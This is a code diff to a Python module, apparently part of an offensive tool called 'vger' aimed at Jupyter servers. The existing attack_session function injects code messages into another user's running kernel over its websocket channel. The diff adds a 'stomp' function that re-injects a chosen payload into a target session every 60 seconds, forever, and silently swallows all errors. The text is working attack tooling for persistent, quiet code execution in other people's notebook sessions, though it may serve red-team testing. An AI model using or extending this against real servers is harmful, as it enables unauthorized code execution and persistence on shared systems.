@@ -6,6 +6,9 @@ from websockets import connect
 import argparse
 from vger.connection import Connection
 import re
+import time
+from websockets.sync import client
+import requests
 
 
 async def attack_session(
@@ -41,17 +44,14 @@ async def attack_session(
         ws_base_url
         + f'api/kernels/{jpy_sess['kernel']['id']}/channels?session_id={jpy_sess['id']}'
     )
-
     async with connect(
         ws_url, extra_headers=connection.headers, close_timeout=5
     ) as conn:
-        with connection.con.status("Receiving.."):
-            await recv_all(conn)
+        await recv_all(conn)
         if print_out:
             connection.print_with_rule(code_msg)
         await conn.send(json.dumps(code_msg))
-        with connection.con.status("Receiving.."):
-            return await recv_all(conn)
+        return await recv_all(conn)
 
 
 async def send_to_terminal(ws, code):
@@ -126,6 +126,20 @@ async def snoop(connection, session, timeout=60):
         ws_url, extra_headers=connection.headers, close_timeout=timeout
     ) as conn:
         await recv_all(conn, timeout)
+
+
+def stomp(connection, target, payload_str, frequency=60):
+    while True:
+        try:
+            loop = asyncio.get_event_loop()
+            loop.run_until_complete(
+                attack_session(
+                    connection, target, payload_str, silent=True, print_out=False
+                )
+            )
+            time.sleep(frequency)
+        except:
+            pass
 
 
 if __name__ == "__main__":
